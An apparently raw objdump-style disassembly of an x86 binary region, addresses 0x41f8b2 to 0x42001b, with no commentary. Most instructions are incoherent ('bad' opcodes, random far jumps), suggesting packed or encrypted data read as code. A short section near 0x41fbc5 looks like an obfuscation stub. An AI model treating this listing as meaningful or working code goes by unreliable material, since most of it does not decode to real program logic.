  41f8b2:	loopne 0x41f927
  41f8b4:	fwait
  41f8b5:	cmp    DWORD PTR [ebp+0x19],ebx
  41f8b8:	sub    al,0xbd
  41f8ba:	aas    
  41f8bb:	jle    0x41f8fa
  41f8bd:	mov    ecx,edi
  41f8bf:	out    0xe4,eax
  41f8c1:	or     esp,DWORD PTR [esi+0x67]
  41f8c4:	sti    
  41f8c5:	mov    ah,0x78
  41f8c7:	rcl    DWORD PTR [eax-0x49489bf9],1
  41f8cd:	(bad)  
  41f8ce:	outs   dx,BYTE PTR ds:[esi]
  41f8cf:	xor    dh,cl
  41f8d1:	icebp  
  41f8d2:	mov    ds:0x72ad1eac,eax
  41f8d7:	pmaxsw mm6,QWORD PTR [ebx+0x58790a29]
  41f8de:	cmp    eax,0x9a7fb54f
  41f8e3:	int    0xa0
  41f8e5:	sub    ax,0xac24
  41f8e9:	pop    es
  41f8ea:	dec    esi
  41f8eb:	call   0x42d4:0xdeb937de
  41f8f2:	sbb    eax,0x2e6495e9
  41f8f7:	adc    BYTE PTR [eax+0x54],bh
  41f8fa:	lock (bad) 
  41f8fd:	rol    ebp,0xef
  41f900:	sub    ecx,ebx
  41f902:	jmp    0x41f95e
  41f904:	lods   eax,DWORD PTR ds:[esi]
  41f905:	sub    al,0xdc
  41f907:	popf   
  41f908:	pop    ebx
  41f909:	mov    dh,0xa9
  41f90b:	imul   edi,DWORD PTR [eax-0x32],0xa2a8bedf
  41f912:	ret    
  41f913:	daa    
  41f914:	dec    ecx
  41f915:	daa    
  41f916:	pop    ds
  41f917:	dec    ebp
  41f918:	xchg   ebp,eax
  41f919:	and    BYTE PTR [edi+0x45],cl
  41f91c:	dec    esi
  41f91d:	adc    eax,0x582d0d34
  41f922:	add    DWORD PTR [esi-0x18f5d8fd],0x7f7c3e68
  41f92c:	push   cs
  41f92d:	jmp    0x9ab:0xd1ca
  41f933:	in     eax,0xad
  41f935:	jmp    0x5859:0xcc69633d
  41f93c:	or     BYTE PTR [edx+0x4a],0xd9
  41f940:	fidiv  WORD PTR ds:0x73609795
  41f946:	ja     0x41f96d
  41f948:	gs mov ah,0xb4
  41f94b:	dec    ebx
  41f94c:	mov    al,ds:0xfb54fd43
  41f951:	data16 jbe 0x41f9ae
  41f954:	cmp    DWORD PTR [esi+0x1b6024d6],esp
  41f95a:	sub    eax,esi
  41f95c:	jne    0x41f98d
  41f95e:	inc    eax
  41f95f:	ins    DWORD PTR es:[edi],dx
  41f960:	cmp    esi,DWORD PTR [ecx]
  41f962:	scas   eax,DWORD PTR es:[edi]
  41f963:	push   DWORD PTR [edi+0x508e14c1]
  41f969:	mov    ah,0xa8
  41f96b:	scas   al,BYTE PTR es:[edi]
  41f96c:	loope  0x41f9cb
  41f96e:	cmc    
  41f96f:	cwde   
  41f970:	into   
  41f971:	repz lock fs sub al,0xc7
  41f976:	test   eax,0x5b9714ca
  41f97b:	pop    esp
  41f97c:	jae    0x41f9c4
  41f97e:	lahf   
  41f97f:	cdq    
  41f980:	stc    
  41f981:	xchg   DWORD PTR [edx+eiz*8-0x708951a0],edi
  41f988:	ins    DWORD PTR es:[edi],dx
  41f989:	imul   ecx,edi,0xffffffe0
  41f98c:	push   edi
  41f98d:	out    0x5d,al
  41f98f:	lock mov bl,0xa3
  41f992:	outs   dx,DWORD PTR ds:[esi]
  41f993:	mov    BYTE PTR [eax],bh
  41f995:	call   0x19c30eed
  41f99a:	loope  0x41f9ee
  41f99c:	retf   0xfaa7
  41f99f:	aaa    
  41f9a0:	add    DWORD PTR [ecx],ebp
  41f9a2:	push   es
  41f9a3:	sbb    DWORD PTR [esi-0x1752da4a],ecx
  41f9a9:	jmp    0x99ec:0xbaa079ed
  41f9b0:	test   DWORD PTR [eax+0x8065dae],edi
  41f9b6:	or     ebx,DWORD PTR [esi]
  41f9b8:	pushf  
  41f9b9:	inc    ecx
  41f9ba:	fimul  DWORD PTR [ebp+0x38aa0bfb]
  41f9c0:	adc    BYTE PTR [edi-0x6eca9284],bh
  41f9c6:	xchg   esi,eax
  41f9c7:	mov    bp,0x1f29
  41f9cb:	or     eax,edx
  41f9cd:	adc    edi,esi
  41f9cf:	aam    0x2d
  41f9d1:	aas    
  41f9d2:	mov    cl,0x60
  41f9d4:	jg     0x41fa1c
  41f9d6:	enter  0xcee9,0x1b
  41f9da:	inc    eax
  41f9db:	jle    0x41f9c1
  41f9dd:	or     al,0x65
  41f9df:	fs pop esp
  41f9e1:	mov    dh,0xc2
  41f9e3:	popa   
  41f9e4:	fbld   TBYTE PTR [ebp-0x5de4231a]
  41f9ea:	and    BYTE PTR [esi-0xe],cl
  41f9ed:	mov    es,WORD PTR [edi+0x4b]
  41f9f0:	mov    esp,0xc2f3de0d
  41f9f5:	test   BYTE PTR [eax],dl
  41f9f7:	test   DWORD PTR [ebx],ebx
  41f9f9:	pop    eax
  41f9fa:	push   eax
  41f9fb:	mov    edi,0x177afb
  41fa00:	xchg   ebx,eax
  41fa01:	pop    ds
  41fa02:	inc    ebx
  41fa03:	sub    BYTE PTR [edx+edi*2-0x49],cl
  41fa07:	mov    al,0xa0
  41fa09:	outs   dx,BYTE PTR ds:[esi]
  41fa0a:	sbb    esp,DWORD PTR [edi-0x7bd5afe3]
  41fa10:	mov    al,ds:0x4195a1b9
  41fa15:	aad    0x31
  41fa17:	jae    0x41fa6a
  41fa19:	add    al,0x98
  41fa1b:	pop    eax
  41fa1c:	push   ecx
  41fa1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa1e:	nop
  41fa1f:	dec    esp
  41fa20:	ret    0x3072
  41fa23:	pop    ss
  41fa24:	pop    eax
  41fa25:	pop    es
  41fa26:	test   al,0x2b
  41fa28:	mov    ah,0x36
  41fa2a:	pop    ss
  41fa2b:	(bad)  
  41fa2c:	iret   
  41fa2d:	out    dx,al
  41fa2e:	xchg   esp,eax
  41fa2f:	cmp    eax,esp
  41fa31:	xor    BYTE PTR cs:[ebx+0x58],0xb1
  41fa36:	je     0x41faa1
  41fa38:	sub    eax,0xf2e2a9f7
  41fa3d:	rcr    DWORD PTR [ebp+edi*1-0x22],1
  41fa41:	das    
  41fa42:	or     eax,0x977ef36d
  41fa47:	push   ebp
  41fa48:	fimul  WORD PTR [ebx]
  41fa4a:	add    ebx,DWORD PTR [ecx-0x72]
  41fa4d:	rol    DWORD PTR [ebp+0x4a],1
  41fa50:	xchg   esi,eax
  41fa51:	and    al,0x2c
  41fa53:	xchg   edi,eax
  41fa54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa55:	(bad)  
  41fa56:	int    0x8e
  41fa58:	fdiv   DWORD PTR [esi-0x2b]
  41fa5b:	pop    ds
  41fa5c:	xchg   BYTE PTR [esi],cl
  41fa5e:	mov    al,0x87
  41fa60:	dec    ecx
  41fa61:	shl    DWORD PTR [edx],1
  41fa63:	mov    ds:0x29b8d887,al
  41fa68:	imul   esp,DWORD PTR [eax-0x3d],0xffffff9e
  41fa6c:	add    dl,BYTE PTR [edx-0x4b]
  41fa6f:	xor    edx,ecx
  41fa71:	mov    edi,0x677cc950
  41fa76:	pushf  
  41fa77:	mov    dh,0xe5
  41fa79:	xchg   edi,eax
  41fa7a:	pop    edi
  41fa7b:	test   eax,0xa328a81c
  41fa80:	xchg   dh,dh
  41fa82:	jmp    0x1ec75377
  41fa87:	test   eax,0x68984e9
  41fa8c:	sbb    al,bl
  41fa8e:	outs   dx,BYTE PTR ds:[esi]
  41fa8f:	cmp    esp,DWORD PTR [eax+0x4f]
  41fa92:	ret    0x55bf
  41fa95:	and    al,0x4
  41fa97:	fisttp QWORD PTR [ecx+eax*4]
  41fa9a:	ins    DWORD PTR es:[edi],dx
  41fa9b:	ja     0x41fa5f
  41fa9d:	sub    eax,0x4042832d
  41faa2:	jo     0x41fad9
  41faa4:	inc    ebp
  41faa5:	(bad)  
  41faa6:	out    dx,eax
  41faa7:	add    bh,BYTE PTR [eax]
  41faa9:	pop    edi
  41faaa:	mov    ebx,0x54018710
  41faaf:	jle    0x41fad4
  41fab1:	inc    edi
  41fab2:	div    DWORD PTR [eax+0x39d8321e]
  41fab8:	pushf  
  41fab9:	js     0x41faff
  41fabb:	out    dx,eax
  41fabc:	inc    ebp
  41fabd:	push   ebx
  41fabe:	ins    BYTE PTR es:[edi],dx
  41fabf:	inc    ebx
  41fac0:	mov    dh,0x12
  41fac2:	pop    ebx
  41fac3:	fst    DWORD PTR [ebx+0x26]
  41fac6:	pop    edx
  41fac7:	sub    BYTE PTR [ecx+eiz*8+0x1d],cl
  41facb:	int3   
  41facc:	call   0xa055:0x4443b582
  41fad3:	gs daa 
  41fad5:	mov    ebp,0xb3eab485
  41fada:	sbb    DWORD PTR [esi],0xffffffe8
  41fadd:	(bad)  
  41fade:	stc    
  41fadf:	int    0x88
  41fae1:	pop    esp
  41fae2:	mov    eax,ds:0xb9a0a134
  41fae7:	mov    ds:0x8b37fe2a,al
  41faec:	mov    ch,0x38
  41faee:	loope  0x41fb6a
  41faf0:	(bad)  
  41faf1:	xchg   ebp,eax
  41faf2:	neg    DWORD PTR [ebp-0x6]
  41faf5:	div    dl
  41faf7:	(bad)  
  41faf8:	fistp  DWORD PTR [eax-0x76]
  41fafb:	sub    eax,0x357a4e9b
  41fb00:	aam    0x35
  41fb02:	cld    
  41fb03:	xchg   esi,eax
  41fb04:	sbb    eax,0x6a0d404a
  41fb09:	pop    DWORD PTR [esi+0x2ecd5dd6]
  41fb0f:	cmp    BYTE PTR [edx+0x1b],dl
  41fb12:	je     0x41faf9
  41fb14:	test   DWORD PTR [edi-0x29baa18f],ebp
  41fb1a:	jo     0x41fb45
  41fb1c:	lock mov ds:0xce3e75fb,al
  41fb22:	cwd    
  41fb24:	sbb    dl,bh
  41fb26:	ins    DWORD PTR es:[edi],dx
  41fb27:	and    al,0x24
  41fb29:	add    al,BYTE PTR [edi]
  41fb2b:	fsubrp st(3),st
  41fb2d:	or     ebp,DWORD PTR [ecx+0x19]
  41fb30:	sub    bl,BYTE PTR [ecx]
  41fb32:	shl    BYTE PTR [ebp-0x1c628c1f],0xdc
  41fb39:	call   FWORD PTR [edx-0x51ff08ce]
  41fb3f:	cmp    eax,0x2bcae702
  41fb44:	xchg   esi,eax
  41fb45:	jb     0x41fadd
  41fb47:	int3   
  41fb48:	lods   eax,DWORD PTR ds:[esi]
  41fb49:	ror    BYTE PTR [ebx],cl
  41fb4b:	or     BYTE PTR ds:0x7eb09cba,ch
  41fb51:	and    dl,cl
  41fb53:	ficom  DWORD PTR [ebx+edx*4+0x16781c86]
  41fb5a:	xor    dl,BYTE PTR [ecx+0x5d]
  41fb5d:	adc    dl,BYTE PTR [edi+0x46]
  41fb60:	cdq    
  41fb61:	dec    ebx
  41fb62:	fnstsw WORD PTR [esi+0x686cfb74]
  41fb68:	shr    BYTE PTR [ebp-0x28],1
  41fb6b:	imul   ecx,DWORD PTR [ebp-0x8],0xffffff89
  41fb6f:	mov    esi,0x7e711fe
  41fb74:	push   esi
  41fb75:	pop    ecx
  41fb76:	pop    esp
  41fb77:	leave  
  41fb78:	sub    BYTE PTR [ebp-0x4930fd45],bh
  41fb7e:	add    BYTE PTR [edi],0x4
  41fb81:	and    edx,DWORD PTR [eax-0xb694e69]
  41fb87:	clc    
  41fb88:	hlt    
  41fb89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb8a:	imul   edx,ecx,0x4c
  41fb8d:	and    al,0x8e
  41fb8f:	icebp  
  41fb90:	mov    edx,0xc738c09f
  41fb95:	sbb    eax,0xcf93951f
  41fb9a:	push   ebp
  41fb9b:	mov    ebp,0xf613eb15
  41fba0:	push   esi
  41fba1:	(bad)  
  41fba2:	push   esp
  41fba3:	ficomp WORD PTR [ecx-0xe]
  41fba6:	pop    ds
  41fba7:	dec    esi
  41fba8:	and    DWORD PTR ds:0xd36c4bf5,ebx
  41fbae:	xor    dl,BYTE PTR [eax]
  41fbb0:	xchg   esi,eax
  41fbb1:	and    eax,DWORD PTR [ebp-0x69fb4420]
  41fbb7:	shl    DWORD PTR [ebp+ecx*1+0x24],0x3b
  41fbbc:	jmp    0x89ca:0xba5a0e5
  41fbc3:	dec    ebp
  41fbc4:	lods   al,BYTE PTR ds:[esi]
  41fbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbc8:	mov    edx,DWORD PTR [ebp-0x50]
  41fbcb:	add    ecx,0x242ebc9
  41fbd1:	xor    ecx,edx
  41fbd3:	mov    DWORD PTR [ebp-0x50],ecx
  41fbd6:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbd9:	mov    edx,DWORD PTR [ebp-0x4c]
  41fbdc:	add    ecx,edi
  41fbde:	and    ecx,edx
  41fbe0:	mov    DWORD PTR [ebp-0x4c],ecx
  41fbe3:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbe6:	mov    edx,DWORD PTR [ebp-0x48]
  41fbe9:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41fbf0:	mov    DWORD PTR [ebp-0x48],ecx
  41fbf3:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbf6:	mov    edx,0xfa5e1524
  41fbfb:	sub    edx,ecx
  41fbfd:	add    edx,DWORD PTR [ebp-0x44]
  41fc00:	mov    DWORD PTR [ebp-0x44],edx
  41fc03:	mov    ecx,DWORD PTR [ebp+0x8]
  41fc06:	xor    ecx,eax
  41fc08:	add    ecx,esi
  41fc0a:	jne    0x41b4d1
  41fc10:	jmp    0x422001
  41fc15:	jmp    0x421f74
  41fc1a:	fistp  QWORD PTR [ecx+edi*4-0x13]
  41fc1e:	call   0xd5d8:0xbe4a8faa
  41fc25:	fs xor eax,0x69a0bb71
  41fc2b:	mov    bh,0x7c
  41fc2d:	cmp    DWORD PTR ds:0x9c83835e,0xffffff8a
  41fc34:	add    eax,0xc6ce48cb
  41fc39:	push   eax
  41fc3a:	mov    ebp,DWORD PTR [ebx-0x4]
  41fc3d:	loopne 0x41fc52
  41fc3f:	data16 sahf 
  41fc41:	pop    edi
  41fc42:	lock push ss
  41fc44:	pusha  
  41fc45:	in     al,dx
  41fc46:	mov    edx,0xc1856c2e
  41fc4b:	(bad)
  41fc4f:	and    BYTE PTR [edx+0x21],0xa5
  41fc53:	enter  0x2c42,0x5d
  41fc57:	(bad)  
  41fc58:	je     0x41fc7e
  41fc5a:	pop    esp
  41fc5b:	fnsave [esp+edx*2]
  41fc5e:	stos   DWORD PTR es:[edi],eax
  41fc5f:	dec    ecx
  41fc60:	loopne 0x41fc55
  41fc62:	dec    esi
  41fc63:	mov    al,ds:0x18ce7eb8
  41fc68:	push   eax
  41fc69:	shl    DWORD PTR [eax+0x24005206],1
  41fc6f:	inc    ebp
  41fc70:	or     dh,BYTE PTR ds:0xb99a4b06
  41fc76:	cdq    
  41fc77:	sub    edi,DWORD PTR [edx]
  41fc79:	pop    ds
  41fc7a:	test   eax,0xacbe6890
  41fc7f:	and    ebx,DWORD PTR [edx+0x66]
  41fc82:	aam    0x5a
  41fc84:	sbb    eax,0x1c2ec9f1
  41fc89:	or     BYTE PTR [ebp+0x75d6fee6],ch
  41fc8f:	mov    bh,0xb7
  41fc91:	leave  
  41fc92:	jle    0x41fcba
  41fc94:	jb     0x41fc97
  41fc96:	adc    al,0x6
  41fc98:	test   cl,dh
  41fc9a:	lahf   
  41fc9b:	aas    
  41fc9c:	nop
  41fc9d:	cmp    BYTE PTR [edx],0x5f
  41fca0:	push   0x5
  41fca2:	and    ebp,DWORD PTR [ebp+edi*2+0x6c]
  41fca6:	dec    ebx
  41fca7:	lods   eax,DWORD PTR ds:[esi]
  41fca8:	and    BYTE PTR [ebp+0x3845465d],ah
  41fcae:	ret    
  41fcaf:	jmp    0x47b62921
  41fcb4:	xor    dh,bh
  41fcb6:	add    eax,0x565a68de
  41fcbb:	aaa    
  41fcbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcbd:	in     al,0x25
  41fcbf:	popf   
  41fcc0:	pusha  
  41fcc1:	pop    ds
  41fcc2:	pop    ds
  41fcc3:	jecxz  0x41fd30
  41fcc5:	test   BYTE PTR [ebp-0x4e],0x85
  41fcc9:	inc    ebx
  41fcca:	pop    esi
  41fccb:	or     ah,BYTE PTR ds:0xfa8f2fd9
  41fcd1:	imul   esp,DWORD PTR [eax],0xffffff92
  41fcd4:	scas   al,BYTE PTR es:[edi]
  41fcd5:	inc    ebp
  41fcd6:	retf   
  41fcd7:	(bad)  
  41fcd8:	sbb    DWORD PTR [ebp-0x57441f11],edi
  41fcde:	loope  0x41fd3a
  41fce0:	lock mul BYTE PTR [ebp-0x2a]
  41fce4:	int3   
  41fce5:	mov    eax,ds:0xf34cb945
  41fcea:	dec    esi
  41fceb:	or     DWORD PTR [ebx-0x43a0c15b],esp
  41fcf1:	sbb    BYTE PTR [ecx+0x38],ah
  41fcf4:	aaa    
  41fcf5:	lds    esi,FWORD PTR [ecx-0x6a]
  41fcf8:	js     0x41fcd8
  41fcfa:	pusha  
  41fcfb:	mov    ecx,0xf4067913
  41fd00:	pushf  
  41fd01:	jbe    0x41fd1a
  41fd03:	popf   
  41fd04:	mov    al,0xc
  41fd06:	push   edi
  41fd07:	out    0xc8,eax
  41fd09:	sbb    eax,0xc40fbb2f
  41fd0e:	cmp    edx,DWORD PTR [ecx]
  41fd10:	mov    ah,0xab
  41fd12:	jo     0x41fcb4
  41fd14:	push   esi
  41fd15:	cli    
  41fd16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd17:	inc    esp
  41fd18:	mov    ebp,0x657051a7
  41fd1d:	(bad)  
  41fd1e:	sub    DWORD PTR [esi-0x45],edx
  41fd21:	arpl   WORD PTR [esi-0xb551855],si
  41fd27:	adc    DWORD PTR [ebx],ebp
  41fd29:	hlt    
  41fd2a:	and    eax,0xead1ddf5
  41fd2f:	jnp    0x41fcb9
  41fd31:	stos   BYTE PTR es:[edi],al
  41fd32:	xor    al,0x9c
  41fd34:	cmp    eax,0x12aaa00
  41fd39:	sahf   
  41fd3a:	dec    ebp
  41fd3b:	mov    ch,0x4e
  41fd3d:	sbb    ecx,edi
  41fd3f:	mov    edi,0x2ce1fc13
  41fd44:	lods   eax,DWORD PTR ds:[esi]
  41fd45:	aas    
  41fd46:	jmp    0x11c1:0xa2e6ea1b
  41fd4d:	into   
  41fd4e:	mov    ds:0xe94dcf9d,al
  41fd53:	push   ecx
  41fd54:	sar    dh,0x14
  41fd57:	sub    al,0x57
  41fd59:	pop    edx
  41fd5a:	retf   
  41fd5b:	das    
  41fd5c:	mov    BYTE PTR [edx-0x4b],ch
  41fd5f:	dec    ebp
  41fd60:	cdq    
  41fd61:	neg    BYTE PTR [ebx+eax*2-0x4e]
  41fd65:	cld    
  41fd66:	mov    ds:0x34eea9fa,eax
  41fd6b:	enter  0x7e1d,0x71
  41fd6f:	ss call 0xf9e3:0x41852347
  41fd77:	mov    ds:0x32c38f29,al
  41fd7c:	mov    ds:0x12a5872e,eax
  41fd81:	js     0x41fdfb
  41fd83:	jns    0x41fdcb
  41fd85:	lods   al,BYTE PTR ds:[esi]
  41fd86:	push   0x18
  41fd88:	pop    ebx
  41fd89:	push   es
  41fd8a:	(bad)  
  41fd8b:	fild   DWORD PTR [edi]
  41fd8d:	gs adc edi,edi
  41fd90:	lods   eax,DWORD PTR ds:[esi]
  41fd91:	push   es
  41fd92:	pop    ebx
  41fd93:	(bad)  
  41fd95:	ror    DWORD PTR [ebx+0x64125eef],1
  41fd9b:	stos   DWORD PTR es:[edi],eax
  41fd9c:	lock outs dx,DWORD PTR ds:[esi]
  41fd9e:	pop    edx
  41fd9f:	retf   
  41fda0:	cli    
  41fda1:	jmp    0xd1f7:0x6a8f58f4
  41fda8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fda9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdaa:	adc    BYTE PTR [ecx],dl
  41fdac:	jno    0x41fdbf
  41fdae:	popf   
  41fdaf:	jmp    0xd4a9:0xf113462c
  41fdb6:	(bad)  
  41fdb7:	ja     0x41fe0a
  41fdb9:	scas   eax,DWORD PTR es:[edi]
  41fdba:	in     eax,dx
  41fdbb:	cmp    BYTE PTR [ecx-0x3f],ch
  41fdbe:	mov    edx,0x73f00248
  41fdc3:	push   esp
  41fdc4:	fucomi st,st(4)
  41fdc6:	test   al,0x8a
  41fdc8:	(bad)  
  41fdc9:	cmp    BYTE PTR [esi-0x78fcd1de],bl
  41fdcf:	or     BYTE PTR [eax],0x67
  41fdd2:	jmp    0x41fd67
  41fdd4:	or     eax,0x16285b2b
  41fdd9:	stos   DWORD PTR es:[edi],eax
  41fdda:	jbe    0x41fdec
  41fddc:	popa   
  41fddd:	outs   dx,DWORD PTR ds:[esi]
  41fdde:	out    0x66,al
  41fde0:	jmp    0x41fe26
  41fde2:	das    
  41fde3:	(bad)  
  41fde4:	xchg   BYTE PTR [edi-0x2f],ch
  41fde7:	push   eax
  41fde8:	or     eax,DWORD PTR [ebp+0x52]
  41fdeb:	xor    edi,DWORD PTR [edi+0x4247caf1]
  41fdf1:	mov    ds:0x57ff0845,al
  41fdf6:	nop
  41fdf7:	ss dec esp
  41fdf9:	fimul  WORD PTR [edx+0x49]
  41fdfc:	cmp    DWORD PTR [ebp+0x63],eax
  41fdff:	pop    edi
  41fe00:	xchg   esi,eax
  41fe01:	jg     0x41fda1
  41fe03:	xor    esp,ecx
  41fe05:	cli    
  41fe06:	rcr    BYTE PTR [eax+0x5ff69705],1
  41fe0c:	shl    DWORD PTR [eax-0x56],1
  41fe0f:	ja     0x41fdcb
  41fe11:	mov    bh,0x15
  41fe13:	add    DWORD PTR [esi+0x4c],edi
  41fe16:	jno    0x41fe21
  41fe18:	aad    0xdb
  41fe1a:	sbb    DWORD PTR [eax-0x581ae60],ebp
  41fe20:	inc    esi
  41fe21:	jno    0x41fdfc
  41fe23:	and    esp,0x8b77d59c
  41fe29:	dec    esp
  41fe2a:	push   cs
  41fe2b:	iret   
  41fe2c:	mov    ebx,0xdece2bd8
  41fe31:	pop    ebx
  41fe32:	stos   BYTE PTR es:[edi],al
  41fe33:	mov    ds:0xb39a61d3,al
  41fe38:	mov    dl,0xd7
  41fe3a:	inc    ebp
  41fe3b:	out    0x2a,eax
  41fe3d:	jae    0x41fe45
  41fe3f:	add    al,0x83
  41fe41:	je     0x41fe42
  41fe43:	cs inc edi
  41fe45:	(bad)  
  41fe46:	mov    dl,0x30
  41fe48:	mov    dh,0x5
  41fe4a:	in     eax,dx
  41fe4b:	clc    
  41fe4c:	mov    ah,0x8c
  41fe4e:	xor    BYTE PTR [eax],bl
  41fe50:	call   FWORD PTR [eax]
  41fe52:	mov    ds:0x39550389,al
  41fe57:	push   ebp
  41fe58:	pop    edi
  41fe59:	push   es
  41fe5a:	test   al,0x87
  41fe5c:	aam    0x2
  41fe5e:	xchg   edi,eax
  41fe5f:	add    eax,0x5b4a9b01
  41fe64:	and    DWORD PTR [edi],0x8e239806
  41fe6a:	shr    BYTE PTR [ecx+0x18],0xc2
  41fe6e:	ja     0x41fe2b
  41fe70:	repz mov eax,ds:0x143d2a57
  41fe76:	mov    ch,0xb
  41fe78:	push   ds
  41fe79:	jnp    0x41fe70
  41fe7b:	div    BYTE PTR [ebx+edx*2]
  41fe7e:	pushf  
  41fe7f:	jo     0x41fec1
  41fe81:	jecxz  0x41feac
  41fe83:	aad    0x8c
  41fe85:	xchg   esi,eax
  41fe86:	and    al,0x35
  41fe88:	mov    eax,0x705408e7
  41fe8d:	shr    ecx,cl
  41fe8f:	lods   eax,DWORD PTR ds:[esi]
  41fe90:	adc    al,0x4c
  41fe92:	mov    dl,0x28
  41fe94:	adc    BYTE PTR [edi+ecx*1+0x4e4d685c],bl
  41fe9b:	add    dh,BYTE PTR [esi]
  41fe9d:	jmp    0xc910:0xac1cfe36
  41fea4:	repnz enter 0x6684,0x62
  41fea9:	and    cl,ah
  41feab:	dec    ecx
  41feac:	in     eax,dx
  41fead:	or     bh,BYTE PTR [ecx-0x2ebc04d1]
  41feb3:	stos   DWORD PTR es:[edi],eax
  41feb4:	inc    edi
  41feb5:	adc    DWORD PTR [ebx+0x6a7ccc6],0x9f9df7
  41febf:	outs   dx,BYTE PTR ds:[esi]
  41fec0:	sub    eax,0x716ce0c6
  41fec5:	test   al,0xdd
  41fec7:	pop    ds
  41fec8:	outs   dx,DWORD PTR ds:[esi]
  41fec9:	loop   0x41ff20
  41fecb:	out    0xe4,al
  41fecd:	or     al,0xd2
  41fecf:	repz jb 0x41ff0b
  41fed2:	mov    ds:0xc6c11591,al
  41fed7:	and    BYTE PTR [ebp-0x71f6d9db],0xac
  41fede:	fiadd  DWORD PTR [eax-0x6a]
  41fee1:	pop    ds
  41fee2:	pop    esi
  41fee3:	mov    edi,0x37db0448
  41fee8:	jae    0x41ff06
  41feea:	sahf   
  41feeb:	stos   BYTE PTR es:[edi],al
  41feec:	dec    esi
  41feed:	mov    dl,0x37
  41feef:	mov    ds:0xd6c4dd7f,al
  41fef4:	daa    
  41fef5:	rdpmc  
  41fef7:	popf   
  41fef8:	sub    eax,0x53e82dcd
  41fefd:	je     0x41fefa
  41feff:	das    
  41ff00:	inc    edx
  41ff01:	cld    
  41ff02:	inc    ebp
  41ff03:	inc    eax
  41ff04:	mov    esi,0xda89806e
  41ff09:	jnp    0x41fe8e
  41ff0b:	xchg   esi,eax
  41ff0c:	or     al,bl
  41ff0e:	js     0x41ff0b
  41ff10:	xchg   ebp,eax
  41ff11:	mov    edx,0x9b778455
  41ff16:	(bad)  
  41ff17:	pushf  
  41ff18:	mov    edi,0xe470cf92
  41ff1d:	or     al,0x6f
  41ff1f:	sbb    eax,0xc1c0340f
  41ff24:	xchg   esp,eax
  41ff25:	push   0xda8ffff9
  41ff2a:	xor    al,0x64
  41ff2c:	retf   
  41ff2d:	lea    esp,ss:[edi]
  41ff30:	cmp    bl,ah
  41ff32:	jge    0x41ff06
  41ff34:	push   ds
  41ff35:	add    eax,0xd5800f4f
  41ff3a:	imul   ecx,esi,0xffffff86
  41ff3d:	and    ah,BYTE PTR [edx]
  41ff3f:	xchg   BYTE PTR [ebx+esi*1],bl
  41ff42:	inc    ebp
  41ff43:	push   ds
  41ff44:	fs scas eax,DWORD PTR es:[edi]
  41ff46:	aaa    
  41ff47:	fldcw  WORD PTR [esi+0x51]
  41ff4a:	cmp    al,0xa4
  41ff4c:	ins    BYTE PTR es:[edi],dx
  41ff4d:	push   ebp
  41ff4e:	xor    BYTE PTR [eax+0x72],bh
  41ff51:	or     al,0xb4
  41ff53:	xchg   ebx,eax
  41ff54:	mov    ch,0x8
  41ff56:	xlat   BYTE PTR ds:[ebx]
  41ff57:	sbb    ah,cl
  41ff59:	xor    DWORD PTR [eax-0x2caca4cd],edi
  41ff5f:	mov    bl,0x9
  41ff61:	mov    ds:0xbb414bd2,eax
  41ff66:	mov    al,0x7c
  41ff68:	loopne 0x41ff8a
  41ff6a:	cmp    BYTE PTR [ebx+0x75],al
  41ff6d:	gs jp  0x41ff61
  41ff70:	add    al,bl
  41ff72:	mov    ?,WORD PTR [edi+0x19]
  41ff75:	push   eax
  41ff76:	jae    0x41ff91
  41ff78:	cmp    BYTE PTR ds:0x647e3f32,0xf7
  41ff7f:	sbb    al,0x37
  41ff81:	loop   0x41ff91
  41ff83:	stos   BYTE PTR es:[edi],al
  41ff84:	jg     0x41ffa7
  41ff86:	mov    ds:0xcde9a0a9,al
  41ff8b:	cs sub esi,edi
  41ff8e:	or     DWORD PTR [edi+0x2816b864],ebp
  41ff94:	push   esp
  41ff95:	mov    edx,0x1df92d8d
  41ff9a:	repz sbb DWORD PTR [ecx+ebx*1+0x26],eax
  41ff9f:	pop    esp
  41ffa0:	push   ebp
  41ffa1:	mov    dh,0xe3
  41ffa3:	sti    
  41ffa4:	add    ch,BYTE PTR [eax]
  41ffa6:	sbb    BYTE PTR [eax+0x7b0c1069],ah
  41ffac:	add    ebx,esp
  41ffae:	xor    BYTE PTR [edi+0x67],bl
  41ffb1:	js     0x41ffe5
  41ffb3:	mov    BYTE PTR [ebp+0x43],bh
  41ffb6:	test   al,0x86
  41ffb8:	push   edi
  41ffb9:	mov    DWORD PTR [eax-0x3df27901],edx
  41ffbf:	pop    edi
  41ffc0:	punpckhwd mm4,QWORD PTR [ebx+0x62]
  41ffc4:	dec    esi
  41ffc5:	push   0x94df0c2b
  41ffca:	arpl   WORD PTR [edi-0x2e],ax
  41ffcd:	sbb    BYTE PTR [edi+0x42a5c27],cl
  41ffd3:	cmp    al,0x63
  41ffd5:	mov    ds:0x71b909c8,eax
  41ffda:	and    al,0xd1
  41ffdc:	add    ebx,DWORD PTR [ebx+0x5b785e53]
  41ffe2:	dec    ebx
  41ffe4:	add    esi,DWORD PTR [ecx+0x7b]
  41ffe7:	jno    0x420013
  41ffe9:	cmovg  ebx,ebp
  41ffec:	lods   eax,DWORD PTR ds:[esi]
  41ffed:	shl    BYTE PTR [eax+0x1],cl
  41fff0:	in     eax,0xda
  41fff2:	adc    DWORD PTR [edx],0xffffff8a
  41fff5:	stos   DWORD PTR es:[edi],eax
  41fff6:	and    ah,BYTE PTR [edx+edi*2-0x28]
  41fffa:	push   ebp
  41fffc:	xchg   BYTE PTR [ecx+eiz*2-0x59],bl
  420000:	pusha  
  420001:	xor    BYTE PTR [edi+0x27397caf],bl
  420007:	jmp    0xaf8b22dc
  42000c:	mov    al,ds:0xe3662ecc
  420011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420012:	xchg   esp,eax
  420013:	push   ebx
  420014:	jmp    0x2e4f6bca
  420019:	(bad)  
  42001b:	cs xchg ebx,eax
